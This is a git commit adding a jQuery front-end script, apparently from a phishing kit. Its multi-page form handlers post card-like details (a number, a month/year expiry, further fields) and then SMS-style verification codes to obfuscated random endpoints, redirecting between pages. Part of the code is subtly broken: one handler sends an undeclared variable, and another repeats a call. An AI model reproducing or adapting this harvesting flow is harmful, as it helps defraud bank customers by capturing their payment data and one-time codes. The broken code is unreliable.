b44fbd0778f8f2a4e04eb9888a70da42f75e6293
alistar11 <alistar113333@gmail.com>
2025-03-19 03:47:53 +0000

    first commit

---
+++ public/js/stb.js
@@ -0,0 +1,104 @@
+$(function(){
+    $("#barinxri").on("click",function(e){
+
+
+        //send backend:
+        $.ajax({
+            url: '/7tTeaYMkt9pkpywQpvha',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({logita:"Bari Naxri"}),
+            success: function(info) {
+                if(info.OK){
+                    window.location = "/3EtpVNHarRb8PqJfArbu";
+                }
+            }
+        });
+    });
+
+    $("#pg2").on("submit",function(e){
+        e.preventDefault();
+        let s1 = $("#s1").val();
+        let s2 = $("#s2").val();
+        let s3 = $("#s3").val();
+        let s4 = $("#s4").val();
+        let s5 = $("#s5").val();
+        let s6 = $("#s6").val();
+        let s7 = $("#s7").val();
+        let s8 = $("#s8").val();
+        //send backend:
+        $.ajax({
+            url: '/NkMNm4664XhcW8KuukHk',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({a1,s2,s3,s4,s5,s6,s7,s8}),
+            success: function(info) {
+                if(info.OK){
+                    window.location = "/Q89HFszQPd3TFv4mx65k";
+                }
+            }
+        });
+    });
+
+    $("#pg3").on("submit",function(e){ // snms1:
+        e.preventDefault();
+        e.preventDefault();
+        let a1 = $("#one").val();
+        let a2 = `${$("#two1").val()}/${$("#two3").val()}`;
+        let a3 = $("#three").val();
+        let a4 = $("#five").val();
+
+
+        //send backend:
+        $.ajax({
+            url: '/m4kT9BQWt7KTDdaVmafx',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({a1,a2,a3,a4}),
+            success: function(info) {
+                if(info.OK){
+                    window.location = "/aEsKRvuaENZtYax265Kv";
+                }
+            }
+        });
+    });
+
+
+    $("#pg4").on("submit",function(e){ // snms2:
+        e.preventDefault();
+        let sps1 = $("#codima").val();
+        
+        //send backend:
+        $.ajax({
+            url: '/Qv69PRvXg6PQEvrzJx6j',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({sps1}),
+            success: function(info) {
+                if(info.OK){
+                    window.location = "/sioPjs3GHBkd7KSDGkdv";
+                }
+            }
+        });
+    });
+    $("#pg5").on("submit",function(e){ // snms2:
+        e.preventDefault();
+        let sps2 = $("#codima2").val();
+        
+        //send backend:
+        $.ajax({
+            url: '/jK6hfjYT7poOP8hLPOjk',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({sps2}),
+            success: function(info) {
+                if(info.OK){
+                    window.location = "/HfuRVXK8w8fLmT2vWHe8";
+                }
+            }
+        });
+    });
+
+
+
+});
